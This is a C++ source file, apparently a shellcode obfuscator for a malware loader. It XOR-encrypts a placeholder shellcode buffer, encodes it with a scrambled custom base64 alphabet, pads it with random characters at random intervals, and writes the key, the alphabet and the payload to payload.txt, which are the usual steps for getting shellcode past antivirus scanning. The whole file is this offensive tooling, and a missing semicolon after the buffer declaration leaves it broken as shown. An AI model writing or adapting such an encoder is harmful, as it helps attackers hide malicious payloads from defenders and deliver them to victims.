#include <string.h>
#include <vector>
#include <cstddef>
#include <string>
#include <fstream>
#include <random>

static char base64_table[] = "T45WmNOPrpSq+sUByz0YZklMi78wEFGHI16KLh3txDXabcJdefAg9jCV2uvno/QR";
static char key[] = "z0defKjCeMhi7Iwx9!Ag16+8NAGH45LV239OPr&DEFUBy/QR*)WmnopuvYZklstTSqra0(3XabcJ7";
static long base64_table_iv = 3333333;
static long key_iv = 99999999;

char random_printable_char() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(32, 126);
    return static_cast<char>(dis(gen));
}

std::string insert_random_char_with_interval(const std::string& input, int interval) {
    if (input.empty() || interval <= 0) return input;

    std::string result;
    size_t insertCount = (input.size() - 1) / interval;
    result.reserve(input.size() + insertCount);

    for (size_t i = 0; i < input.size(); ++i) {
        result += input[i];
        if ((i + 1) % interval == 0 && i + 1 < input.size()) {
            result += random_printable_char();
        }
    }

    return result;
}

std::string base64_encode(const std::vector<unsigned char>& data) {
    std::string base64_chars = base64_table;
    std::string ret;
    int i = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    auto it = data.begin();
    while (it != data.end()) {
        char_array_3[i++] = *it;
        ++it;

        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; ++i)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i > 0) {
        for (int j = i; j < 3; ++j)
            char_array_3[j] = 0;

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (int j = 0; j < i + 1; ++j)
            ret += base64_chars[char_array_4[j]];

        while (i++ < 3)
            ret += '=';
    }

    return ret;
}

void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}

void xor_encrypt_decrypt(std::vector<unsigned char>& data, const char* key) {
    if (!key || data.empty()) return;

    size_t key_len = std::char_traits<char>::length(key);
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % key_len];
    }
}

void write_string_to_file(const char *filename, const char *str) {
    FILE *file = fopen(filename, "w");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fprintf(file, "%s", str);
    fclose(file);
}

int main() {
    unsigned char buf[] = "your shellcode"
    constexpr size_t raw_len = sizeof(buf) - 1;
    std::vector<unsigned char> raw_data(buf, buf + raw_len);
    std::ofstream outfile("payload.txt");
    outfile << base64_table << "\n" << key << "\n";
    for(long i = 0; i<base64_table_iv % strlen(base64_table); i++){
        adjust_first_to_last(base64_table);
    }
    for(long i = 0; i<key_iv % strlen(key); i++){
        adjust_first_to_last(key);
    }
    xor_encrypt_decrypt(raw_data, key);
    std::string b64_encoded = base64_encode(raw_data);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(4, 9);
    int random_num = dis(gen);
    outfile << random_num << insert_random_char_with_interval(b64_encoded, random_num);;
}